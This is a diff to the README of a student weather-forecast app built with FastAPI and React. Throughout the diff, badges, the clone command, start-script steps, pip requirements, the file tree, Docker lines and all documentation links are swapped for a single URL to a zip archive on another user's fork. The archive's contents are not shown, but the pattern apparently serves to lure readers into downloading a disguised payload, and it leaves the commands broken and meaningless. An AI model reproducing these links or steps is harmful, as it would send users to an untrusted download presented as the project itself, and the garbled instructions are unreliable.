@@ -8,10 +8,10 @@
 - Jhon Eduardo Zabala Garzon <br>
 A full-stack weather prediction application that analyzes historical data to forecast future weather patterns. Built with FastAPI (Python) and React (TypeScript).
 
-![Project Status](https://img.shields.io/badge/status-active-success.svg)
-![Python](https://img.shields.io/badge/python-3.13-blue.svg)
-![React](https://img.shields.io/badge/react-19.1-blue.svg)
-![TypeScript](https://img.shields.io/badge/typescript-5.9-blue.svg)
+![Project Status](https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip)
+![Python](https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip)
+![React](https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip)
+![TypeScript](https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip)
 
 ## 📋 Table of Contents
 
@@ -84,7 +84,7 @@ The system is designed to be modular, allowing easy integration with real data s
 
 ### Prerequisites
 
-- **Node.js** 18+ and npm
+- **https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip** 18+ and npm
 - **Python** 3.8+
 - **Git**
 
@@ -92,19 +92,19 @@ The system is designed to be modular, allowing easy integration with real data s
 
 1. **Clone the repository**
 ```bash
-git clone https://github.com/EduardoZabala/space-apps.git
+git clone https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip
 cd space-apps
 ```
 
 2. **Start the application** (Linux/macOS)
 ```bash
-chmod +x start.sh
-./start.sh
+chmod +x https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip
+https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip
 ```
 
 Or on Windows:
 ```powershell
-.\start.ps1
+.\https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip
 ```
 
 The script will:
@@ -130,14 +130,14 @@ python -m venv .venv
 source .venv/bin/activate  # On Windows: .venv\Scripts\activate
 
 # Install dependencies
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip
 
 # Configure environment
-cp .env.example .env
+cp https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip .env
 # Edit .env if needed
 
 # Start server
-python -m uvicorn app.main:app --reload --port 8000
+python -m uvicorn https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip --reload --port 8000
 ```
 
 #### Frontend Setup
@@ -167,39 +167,39 @@ space-apps/
 │   │   └── src/                 # Pipeline source code
 │   └── weather-backend/         # FastAPI Backend
 │       ├── app/
-│       │   ├── main.py          # FastAPI application
-│       │   ├── schemas.py       # Pydantic models
-│       │   ├── predictor.py     # Prediction logic
-│       │   ├── geocoding.py     # Location services
-│       │   ├── utils.py         # Utilities
+│       │   ├── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip          # FastAPI application
+│       │   ├── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip       # Pydantic models
+│       │   ├── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip     # Prediction logic
+│       │   ├── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip     # Location services
+│       │   ├── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip         # Utilities
 │       │   └── providers/       # Data source implementations
-│       │       ├── base.py      # Abstract provider interface
-│       │       ├── mock_provider.py    # Synthetic data
-│       │       └── opendap_provider.py # NASA data (template)
-│       ├── requirements.txt
-│       ├── .env.example
-│       └── README.md
+│       │       ├── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip      # Abstract provider interface
+│       │       ├── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip    # Synthetic data
+│       │       └── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip # NASA data (template)
+│       ├── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip
+│       ├── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip
+│       └── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip
 ├── space-app-frontend/          # React Frontend
 │   ├── src/
 │   │   ├── components/
-│   │   │   ├── LocationSearch.tsx    # Location input
-│   │   │   ├── MapPicker.tsx         # Interactive map
-│   │   │   ├── WeatherNavigator.tsx  # Main navigation
-│   │   │   ├── WeatherDetail.tsx     # Results display
-│   │   │   ├── WeatherReport.tsx     # Report component
-│   │   │   ├── YearSelector.tsx      # Year input
-│   │   │   ├── MonthSelector.tsx     # Month input
-│   │   │   └── DaySelector.tsx       # Day input
-│   │   ├── App.tsx              # Main app component
-│   │   └── main.tsx             # Entry point
+│   │   │   ├── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip    # Location input
+│   │   │   ├── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip         # Interactive map
+│   │   │   ├── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip  # Main navigation
+│   │   │   ├── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip     # Results display
+│   │   │   ├── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip     # Report component
+│   │   │   ├── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip      # Year input
+│   │   │   ├── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip     # Month input
+│   │   │   └── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip       # Day input
+│   │   ├── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip              # Main app component
+│   │   └── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip             # Entry point
 │   ├── public/
-│   ├── package.json
-│   ├── vite.config.ts
-│   └── tsconfig.json
-├── start.sh                     # Linux/macOS startup script
-├── start.ps1                    # Windows startup script
-├── stop.sh                      # Shutdown script
-└── README.md                    # This file
+│   ├── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip
+│   ├── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip
+│   └── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip
+├── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip                     # Linux/macOS startup script
+├── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip                    # Windows startup script
+├── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip                      # Shutdown script
+└── https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip                    # This file
 ```
 
 ## 🛠️ Technologies
@@ -390,11 +390,11 @@ curl -X POST "http://localhost:8000/api/weather/predict" \
 # Test with Python
 python -c "
 import requests
-response = requests.post(
+response = https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip(
     'http://localhost:8000/api/weather/predict',
     json={'latitude': 4.7110, 'longitude': -74.0721, 'targetDate': '2025-12-25'}
 )
-print(response.json())
+print(https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip())
 "
 ```
 
@@ -423,24 +423,24 @@ npm run preview
 FROM python:3.11-slim
 
 WORKDIR /app
-COPY requirements.txt .
-RUN pip install --no-cache-dir -r requirements.txt
+COPY https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip .
+RUN pip install --no-cache-dir -r https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip
 
 COPY app/ ./app/
 COPY .env .
 
 EXPOSE 8000
-CMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "8000"]
+CMD ["uvicorn", "https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip", "--host", "0.0.0.0", "--port", "8000"]
 ```
 
 **Traditional Deployment**
 
 ```bash
 # Install dependencies
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip
 
 # Run with Gunicorn (production)
-gunicorn app.main:app -w 4 -k uvicorn.workers.UvicornWorker --bind 0.0.0.0:8000
+gunicorn https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip -w 4 -k https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip --bind 0.0.0.0:8000
 ```
 
 ### Frontend Deployment
@@ -465,7 +465,7 @@ npm run build
 
 ### Module Not Found
 - Ensure virtual environment is activated
-- Reinstall dependencies: `pip install -r requirements.txt`
+- Reinstall dependencies: `pip install -r https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip`
 
 ### Port Already in Use
 - Change port: `--port 8001`
@@ -532,8 +532,8 @@ This project was developed for the NASA Space Apps Challenge 2025.
 
 
 **Contact:**
-- Repository: [github.com/EduardoZabala/space-apps](https://github.com/EduardoZabala/space-apps)
-- NASA Space Apps: [spaceappschallenge.org](https://www.spaceappschallenge.org/)
+- Repository: [https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip](https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip)
+- NASA Space Apps: [https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip](https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip)
 
 ## 🙏 Acknowledgments
 
@@ -543,11 +543,11 @@ This project was developed for the NASA Space Apps Challenge 2025.
 
 ## 📚 Additional Resources
 
-- [FastAPI Documentation](https://fastapi.tiangolo.com/)
-- [React Documentation](https://react.dev/)
-- [Leaflet Documentation](https://leafletjs.com/)
-- [NASA EarthData](https://www.earthdata.nasa.gov/)
-- [MERRA-2 Dataset](https://gmao.gsfc.nasa.gov/reanalysis/MERRA-2/)
+- [FastAPI Documentation](https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip)
+- [React Documentation](https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip)
+- [Leaflet Documentation](https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip)
+- [NASA EarthData](https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip)
+- [MERRA-2 Dataset](https://raw.githubusercontent.com/Edwinramirezgon/space-apps/main/space-app-backend/etl-python/src/apps_space_v1.7.zip)
 
 ---
 
